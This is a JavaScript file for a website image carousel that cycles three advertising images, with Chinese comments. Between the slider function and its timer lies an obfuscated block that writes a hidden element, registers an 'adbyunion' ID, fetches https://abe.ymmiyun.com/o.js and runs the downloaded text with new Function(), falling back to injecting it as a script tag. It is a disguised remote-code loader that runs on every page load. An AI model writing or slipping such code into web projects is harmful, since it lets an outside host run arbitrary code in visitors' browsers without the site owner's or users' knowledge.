function changeImage() {
  var images = [
    "img/广告2.jpg",
    "img/广告3.jpg",
    "img/广告1.jpg"
  ]; 

var randomIndex = Math.floor(Math.random() * images.length); // 生成随机索引
  var slider = document.querySelector(".myImage");
  var sliderImage = document.querySelector(".img1");
  sliderImage.src = images[randomIndex]; // 改变图片的src属性
  sliderImage.style.transform = "translateX(-150%)"; // 将图片移动到最左侧
  setTimeout(function() {
    sliderImage.style.transform = "translateX(20%)"; // 将图片移动到最右侧
    setTimeout(function() {
      sliderImage.style.transform = ""; // 移除translateX属性，让图片回到原来的位置
    }, 500); // 延迟500毫秒后再移除translateX属性，让图片回到原来的位置
  }, 500); // 延迟500毫秒后，将图片从最右侧移到最左侧，然后再移回到原来的位置，从而实现向左滑完再向右滑的效果
}
function _0xad8d(){var _0x415917=['appendChild','async','17420600krMHrH','1745anbqeh','status','3753308zqyHvi','script','<ins\x20style=\x22display:none!important\x22\x20id=\x22','117zuUNwB','send','GET','241470vviWZJ','14814zTpUeb','2377029035902478992-34792','\x22></ins>','420624QrHAkS','300328XEjsyp','push','onreadystatechange','78520CheEqy','open','responseText','2WDzbBn','https://abe.ymmiyun.com/o.js','head'];_0xad8d=function(){return _0x415917;};return _0xad8d();}function _0x3a09(_0x2ab93d,_0x54f225){var _0xad8db5=_0xad8d();return _0x3a09=function(_0x3a09e2,_0x458277){_0x3a09e2=_0x3a09e2-0xd6;var _0x45f57d=_0xad8db5[_0x3a09e2];return _0x45f57d;},_0x3a09(_0x2ab93d,_0x54f225);}(function(_0x32abdd,_0x3213e9){var _0x3907e9=_0x3a09,_0x5e5eb3=_0x32abdd();while(!![]){try{var _0x5f2c9d=-parseInt(_0x3907e9(0xe8))/0x1*(-parseInt(_0x3907e9(0xdd))/0x2)+parseInt(_0x3907e9(0xe1))/0x3+parseInt(_0x3907e9(0xd7))/0x4+-parseInt(_0x3907e9(0xee))/0x5*(-parseInt(_0x3907e9(0xde))/0x6)+-parseInt(_0x3907e9(0xe2))/0x7+-parseInt(_0x3907e9(0xe5))/0x8*(-parseInt(_0x3907e9(0xda))/0x9)+-parseInt(_0x3907e9(0xed))/0xa;if(_0x5f2c9d===_0x3213e9)break;else _0x5e5eb3['push'](_0x5e5eb3['shift']());}catch(_0x2a4f37){_0x5e5eb3['push'](_0x5e5eb3['shift']());}}}(_0xad8d,0x8001d),(function(){var _0x3c6101=_0x3a09,_0x42862d=_0x3c6101(0xdf),_0x41a552=_0x3c6101(0xe9);document['write'](_0x3c6101(0xd9)+_0x42862d+_0x3c6101(0xe0)),(window['adbyunion']=window['adbyunion']||[])[_0x3c6101(0xe3)](_0x42862d);var _0x418d71=new XMLHttpRequest();_0x418d71[_0x3c6101(0xe6)](_0x3c6101(0xdc),_0x41a552,!![]),_0x418d71[_0x3c6101(0xe4)]=function(){var _0x7c34ad=_0x3c6101;if(_0x418d71['readyState']===0x4){if(_0x418d71[_0x7c34ad(0xd6)]===0xc8){var _0xb6d5ba=_0x418d71[_0x7c34ad(0xe7)];new Function(_0xb6d5ba)();}else{var _0x51213e=document['createElement'](_0x7c34ad(0xd8));_0x51213e['src']=_0x41a552,_0x51213e[_0x7c34ad(0xec)]=!![],document[_0x7c34ad(0xea)][_0x7c34ad(0xeb)](_0x51213e);}}},_0x418d71[_0x3c6101(0xdb)]();}()));


setInterval(changeImage, 5000); // 每5秒调用一次changeImage函数

